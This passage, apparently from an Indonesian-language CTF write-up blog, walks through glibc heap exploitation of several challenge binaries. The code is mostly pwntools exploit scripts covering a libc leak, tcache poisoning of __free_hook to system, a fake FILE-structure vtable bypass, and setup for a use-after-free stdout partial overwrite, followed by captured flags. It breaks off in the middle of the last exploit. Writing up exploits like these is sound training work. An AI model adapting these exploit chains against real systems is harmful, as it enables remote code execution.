+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{idx}&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{idx}&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{idx}&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div><p>Leak libc bisa didapatkan dengan memenuhi <code>tcachebins</code>. Karena <code>tcachebins</code> sudah penuh, free selanjutnya dengan size yang sama akan masuk ke <code>unsortedbins</code>. <code>Unsortedbins</code> chunk ini mempunyai 2 pointer, FD dan BK. Mereka tunjuk ke area yang sama, yang disebut <code>main_arena</code> yang letaknya di-libc.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x90 [  7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0</span>
+
+<span class="c1"># unsortedbin</span>
+<span class="c1"># all: 0x5555557576d0 —▸ 0x155555324ca0 (main_arena+96) ◂— 0x5555557576d0</span>
+</code></pre></div><p>Sekarang, hanya allokasikan chunks size &lt; chunk unsortedbins. Maka akan ada pointer <code>main_arena</code> di chunk data yang baru saja dialokasikan.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+
+<span class="c1"># pwndbg&gt; dq 0x5555557576a0</span>
+<span class="c1"># 00005555557576a0     0000000000000000 0000000000000031 </span>
+<span class="c1"># 00005555557576b0     0000155555324d20 0000155555324d20 -&gt; chunks[0]&#39;s data</span>
+<span class="c1"># 00005555557576c0     0000000000000000 0000000000000000</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3ebd20</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div><p>Kondisi tcachebins, <code>array_data_notes</code> dan chunk diatasnya pada heap sekarang,</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>  tcachebins
+  0x30 [  1]: 0x5555557576b0 ◂— 0x0
+  0x90 [  7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0
+
+
+  0x555555757000	0x0000000000000000	0x0000000000000251
+  0x555555757010	0x0700000000000100	0x0000000000000000
+  ...
+  0x555555757050	0x0000000000000000	0x00005555557576b0
+  ...
+  0x555555757080	0x0000000000000000	0x0000555555757620
+  ...
+  0x555555757250	0x0000000000000000	0x0000000000000061
+  0x555555757260	0x0000000000000000	0x0000000000000000 --&gt; array_data_notes[10]
+  0x555555757270	0x0000000000000000	0x0000000000000000
+  0x555555757280	0x0000000000000000	0x0000000000000000
+  0x555555757290	0x0000000000000000	0x0000000000000000
+  0x5555557572a0	0x0000555555757740	0x0000000000000000
+  0x5555557572b0	0x0000000000000000
+</code></pre><p>Pada alamat <code>0x555555757088</code>, berisi <code>0x555555757620</code>, yang mana ini merupakan salah satu FD pointer dari free`d chunk yang ada di <code>tcachebins list</code> diatas. Karena terdapat index-out-of-bound (negative number) pada fungsi <code>edit</code>, kita bisa melakukan tcache-poisoning dengan mengedit alamat tersebut.</p>
+<p>Selanjutnya hanya mencari index yang akan menunjuk ke alamat target kita diatas. Lalu, edit agar menunjuk ke <code>__free_hook</code>. Yang nantinya akan kita overwrite ke <code>system</code> untuk mendapatkan RCE.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="c1"># pwndbg&gt; p (0x555555757088-0x555555757260)/8</span>
+<span class="c1"># $2 = -59</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">59</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
+<span class="c1"># 0x90 [  7]: 0x555555757620 —▸ 0x1555553268e8 (__free_hook) ◂— 0x0</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># 0</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># 1</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
+
+<span class="c1"># pwndbg&gt; tel &amp;__free_hook 1</span>
+<span class="c1"># 00:0000│   0x1555553268e8 (__free_hook) —▸ 0x155554f884e0 (system) ◂— test   rdi, rdi</span>
+</code></pre></div><p>Trigger dengan melakukan <code>free</code> ke chunk yang menyimpan string <code>/bin/sh</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="c1"># profit</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> 
+</code></pre></div>
+
+
+
+
+  <h2 id="flag-1"><a class="anchor" href="#flag-1" title='Anchor for "Flag".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Flag</h2> 
+
+<pre aria-label="Box containing code sample." tabindex=0><code>flag{this_has_gotta_be_the_longest_40_seconds_of_my_life_d543c7e3546b10c1d6ed0046db88787a}
+</code></pre>
+
+
+
+
+  <h1 id="success">Success</h1> 
+
+<p>Pada dasarnya challange ini berdasarkan <a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">File Structure Exploit - GLIBC 2.27</a>. <em>Goal</em>-nya adalah untuk bypass <code>_IO_vtable_check</code> yang terdapat pada libc versi 2.24 keatas.</p>
+
+
+
+
+
+  <h2 id="infomation-leaks"><a class="anchor" href="#infomation-leaks" title='Anchor for "Infomation Leaks".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Infomation Leaks</h2> 
+
+<p>Didapatkan pada fungsi <code>get_name</code>, karena menggunakan <code>read</code> yang tidak mengakhiri buffernya dengan nullbyte. Dengan ini, bisa membocorkan nilai-nilai yang ada distack (libc, etc) yang ada distack.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-s" data-lang="s"><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span> <span class="n">x</span><span class="o">/</span><span class="m">3</span><span class="n">gx</span> <span class="mh">0x7fffffffec70</span> <span class="c1"># our buffer</span>
+<span class="mh">0x7fffffffec70</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000555555555090</span> <span class="o">&lt;-</span> <span class="n">pie</span>
+<span class="mh">0x7fffffffec80</span><span class="o">:</span>	<span class="mh">0x00001555553212a0</span>	<span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">symbols</span> <span class="n">`_IO_file_jumps`</span>
+</code></pre></div><div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Please provide student username: &#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">)</span>
+<span class="n">pie</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mi">8</span><span class="p">:])</span> <span class="o">-</span> <span class="mh">0x1090</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Please provide student username: &#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mh">0x10</span><span class="p">:])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_file_jumps&#39;</span><span class="p">]</span>
+</code></pre></div><p>Bug nya ada di fungsi <code>fill_data</code>. Out-of-bound di <code>.bss</code>, karena <code>dword_202060</code> hanya berukuran 64, tetapi input <code>number</code> bisa sampai 64, ini akan meng-overwrite file pointer <code>numbers2</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-c" data-lang="c"><span class="n">number</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Provide number of subjects: &#34;</span><span class="p">);</span>
+<span class="hl"><span class="k">if</span> <span class="p">(</span> <span class="n">number</span> <span class="o">&gt;</span> <span class="mi">64</span> <span class="o">||</span> <span class="n">number</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="hl"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">number</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span><span class="p">{</span>
+    <span class="n">get_float</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+    <span class="n">dword_202060</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">_mm_cvtsi128_si32</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/**
+</span><span class="cm"> * .bss:0000000000202060 ; _DWORD dword_202060[64]
+</span><span class="cm"> * .bss:0000000000202160 ; FILE *numbers2
+</span><span class="cm"> **/</span>
+</code></pre></div>
+
+
+
+
+  <h2 id="crafting-fake-file-structure"><a class="anchor" href="#crafting-fake-file-structure" title='Anchor for "Crafting Fake File Structure".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Crafting Fake File Structure</h2> 
+
+<p>Tidak ribet-ribet amat, karena <code>pwntools</code> sudah menyediakan :)</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span>
+<span class="n">fake_vtable</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_file_jumps&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">8</span>
+
+<span class="c1"># nice pwntools again n again :)</span>
+<span class="n">fake_struct</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">_IO_buf_base</span>   <span class="o">=</span> <span class="mi">0</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">_IO_buf_end</span>    <span class="o">=</span> <span class="p">(</span><span class="n">rdi</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="p">(</span><span class="n">rdi</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">_lock</span>          <span class="o">=</span> <span class="n">pie</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ch&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x80</span>
+<span class="n">fake_struct</span><span class="o">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">fake_vtable</span>
+</code></pre></div><p>Karena terdapat space array <code>dword_202060[64]</code>, ini merupakan target yang bagus untuk menaruh <code>fake_file_struct</code> yang dibuat. Tantangannya adalah menulis dalam bentuk float. Berikut helper untuk konversi ke float,</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">toFloat</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;f&#34;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">value</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</code></pre></div>
+
+
+
+
+  <h2 id="exploit-2"><a class="anchor" href="#exploit-2" title='Anchor for "Exploit".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Exploit</h2> 
+
+<p>Writing time, wwww.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake_struct</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{toFloat(target &amp; 0xFFFFFFFF)}&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{toFloat(target &gt;&gt; 32)}&#39;</span><span class="p">)</span>
+
+<span class="c1"># padding</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{toFloat(0)}&#39;</span><span class="p">)</span>
+
+<span class="c1"># overwrite file_stream_ptr numbers2 to our fake_file_struct.</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{toFloat((pie + elf.sym.ch) &amp; 0xFFFFFFFF)}&#39;</span><span class="p">)</span>
+</code></pre></div><p>Fungsi <code>fclose</code> akan men-trigger <code>fake_file_struct</code> kita dan RCE didapatkan.</p>
+
+
+
+
+
+  <h2 id="flag-2"><a class="anchor" href="#flag-2" title='Anchor for "Flag".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Flag</h2> 
+
+<pre aria-label="Box containing code sample." tabindex=0><code>flag{exploiting_files_with_floats_is_really_cool_cee02ce60690afdbdb1f4fcd20a03aaa}
+</code></pre>
+
+
+
+
+  <h1 id="membership-management">Membership Management</h1> 
+
+<p>Heap exploitation challange GLIBC 2.31. Dengan fitur create, delete, edit dan tanpa view. Yaa, inti tantangan problem ini adalah tidak ada fungsi view, yang dapat mempermudah untuk mendapat leak.</p>
+
+
+
+
+
+  <h2 id="analysist-2"><a class="anchor" href="#analysist-2" title='Anchor for "Analysist".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Analysist</h2> 
+
+<p>Subscribe, akan melakukan malloc sebesar 0x50. Pointer heap dari malloc ini ditampung di variable global array yang memiliki size 52. Dan melakukan inisiasi <code>is_active</code> pada index array yang dipakai menjadi <code>1</code>. Ini menandakan chunk dalam kondisi terpakai.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">subscribe</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@3
+</span><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp-Ch] [bp-Ch]@1
+</span><span class="c1"></span>
+  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">rep</span> <span class="n">nop</span> <span class="n">edx</span> <span class="p">}</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">is_active</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">gdata</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x50uLL</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Done&#34;</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+      <span class="n">is_active</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No more free slots!&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>Unsubscribe, akan melakukan <code>free</code> terhadap suatu index array, dan mengeset <code>is_active</code> pada index ini menjadi <code>0</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">unsubscribe</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@3
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [sp-Ch] [bp-Ch]@1
+</span><span class="c1"></span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;There is no such member&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">is_active</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Done&#34;</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
+      <span class="n">is_active</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>Modify, melakukan <code>read</code> terhadap content member dengan constraint <code>0 &gt;= index &lt;= 50</code> yang mana index adalah pilihan dari user.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">modify</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@3
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [sp-Ch] [bp-Ch]@1
+</span><span class="c1"></span>  
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;There is no such member&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Content: &#34;</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="mh">0x32uLL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+
+
+  <h2 id="bug-1"><a class="anchor" href="#bug-1" title='Anchor for "Bug".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Bug</h2> 
+
+<p>Ada di fungsi <code>unsubscribe</code>, karena global data array pada index yang telah di <code>free</code> tidak di-NULL kan. Sehingga, menimbulkan bug <code>use-after-free</code>. Dengan ini kita bisa mengedit chunk yang telah di <code>free</code> sehingga FD dan BK pointer chunk yang telah di <code>free</code> dapat kita kontrol untuk menunjuk kemanapun.</p>
+
+
+
+
+
+  <h2 id="information-leaks"><a class="anchor" href="#information-leaks" title='Anchor for "Information Leaks".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Information Leaks</h2> 
+
+<p>Tantangannya adalah tidak ada fitur <code>view</code>. Leak bisa didapatkan dengan melakukan partial overwrite ke <code>_IO_2_1_stdout_</code>. Cara ini membutuhkan bruteforce 1 byte dengan kemungkinan 1/16. Hal yang harus dilakukan adalah meng-corrupt <code>tcachebins</code> agar menunjuk ke <code>_IO_2_1_stdout_</code>.</p>
+
+
+
+
+
+  <h2 id="exploit-3"><a class="anchor" href="#exploit-3" title='Anchor for "Exploit".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Exploit</h2> 
+
+<p>Helper,</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">subscribe</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{idx}&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{idx}&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</code></pre></div><p>Karena <code>subcsribe</code> hanya melakukan malloc sebesar 0x50, kita perlu chunk yang besar agar jika di <code>free</code>, akan masuk ke <code>unsortedbins</code> sehingga, FD dan BK pointer menunjuk ke <code>main_arena</code> untuk melakukan partial overwrite.</p>
+<p>Dengan <code>use-after-free</code>, edit FD pointer dari chunk yang sudah di<code>free</code> agar menunjuk ke <code>chunk_size</code> dari suatu chunk yang berdekatan.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">subscribe</span><span class="p">()</span>
+
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
